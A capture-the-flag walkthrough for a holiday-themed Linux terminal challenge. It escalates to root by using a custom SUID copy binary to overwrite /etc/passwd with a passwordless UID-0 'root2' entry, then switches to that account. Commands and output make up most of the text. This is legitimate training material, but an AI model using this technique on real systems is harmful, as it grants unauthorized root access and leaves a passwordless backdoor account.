In-game terminal (on Island of Misfit Toys: Scaredy Kite Heights, follow the path northeast of the dock to get to the northern most part of the island to find the Ostrich Saloon)
Objective: Escalate privileges in the linux terminal.
Hints:
  https://payatu.com/blog/a-guide-to-linux-privilege-escalation/
  Use privileged binary to overwrite a file to escalate privileges or make it easier with crafty arguments.
  (Good read from google search: become root with etc/passwd) https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/


(Initial message at startup)
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *


(Of all exploits in the first hint, number 3 to exploit SUID executable looks promising.)
~$ find / -perm -u=s -type f 2>/dev/null
  /usr/bin/chfn
  /usr/bin/chsh
  /usr/bin/mount
  /usr/bin/newgrp
  /usr/bin/su
  /usr/bin/gpasswd
  /usr/bin/umount
  /usr/bin/passwd
  /usr/bin/simplecopy


(https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
(See bonus hack from the link above. We can add a root user without a password with simplecopy. First see how /etc/passwd looks.)
~$ head -3 /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin


(Create a file with root2 user having root access and no password.)
~$ echo root2::0:0:root:/root:/bin/bash > root2


(Combine /etc/passwd and ./root2 to make a new passwd file.)
~$ cat /etc/passwd root2 > passwd


(Copy our passwd into /etc/passwd.)
~$ /usr/bin/simplecopy passwd /etc/passwd
~$ tail -2 /etc/passwd
  elf:x:1000:1000::/home/elf:/bin/sh
  root2::0:0:root:/root:/bin/bash


(Switch to root2, go to the /root/ directory, and see what is there.)
~$ su root2
~# cd /root/
~# ls -al
  total 620
  drwx------ 1 root root   4096 Dec  2 22:17 .
  drwxr-xr-x 1 root root   4096 Jan  6 14:33 ..
  -rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
  -rw-r--r-- 1 root root    161 Dec  5  2019 .profile
  -rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer


(Run the binary. Use santa as the answer.)
~# ./runmetoanswer
  Who delivers Christmas presents?

  > santa
  Your answer: santa

  Checking....
  Your answer is correct!


(Challenge complete. You can now talk to Rose Mold to get a hint about other areas around the island:)
Not all the areas around Geese Islands have been mapped, and may contain wonderous treasures. Go exploring, hunt for treasure, and find the pirate's booty!
